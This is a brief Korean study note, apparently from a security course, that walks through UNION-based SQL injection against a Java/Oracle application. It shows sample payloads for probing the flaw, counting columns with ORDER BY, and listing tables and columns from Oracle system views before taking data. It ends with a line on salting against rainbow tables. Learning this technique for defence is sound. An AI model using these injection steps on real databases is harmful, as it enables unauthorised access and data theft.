## Union SQLi

UNION 연산자 사용 조건
1. 기존 SELECT 문과 UNION SELECT 문의 컬럼 수가 동일해야 한다.
2. 각각의 컬럼은 순서 별로 동일한 데이터형이어야 한다.

공격 진행 과정(JAVA - ORACLE)

1. SQLi 취약점 존재 여부
	싱글쿼터(`'`), 파이프(`|`) 등과 같은 특수문자 검색 → 서버 반응 확인
	```sql
	SELECT ZIP_CODE, DONG, ADDRS
	FROM POST
	WHERE DONG LIKE "%param_dong%"
	```
2. UNION SQLi
	1. 컬럼 수 추출
		`ORDER BY` 절 사용
		```SQL
		ORDER BY 1, 2, 3, 4...
		```
	2. 컬럼 데이터형 추출
		`NULL`, 숫자형, 문자형 조회
		```sql
		UNION SELECT NULL, NULL, NULL FROM DUAL
		```
		`DUAL` → 더미 데이터
3. 데이터 탈취
	1. 전체 테이블 목록 추출
		```SQL
		SELECT TABLE_NAME 
		FROM ALL_TABLES
		```
	2. 테이블의 컬럼명 추출
		```SQL
		UNION SELECT NULL, COLUMN_NAME, NULL
		FROM ALL_TAB_COLUMNS
		WHERE TABLE_NAME='LHSMEMBERS3'--
		```
	3. 원하는 데이터 탈취

RAINBOW TABLE
복잡도와 길이를 늘려라
SALT 값을 추가
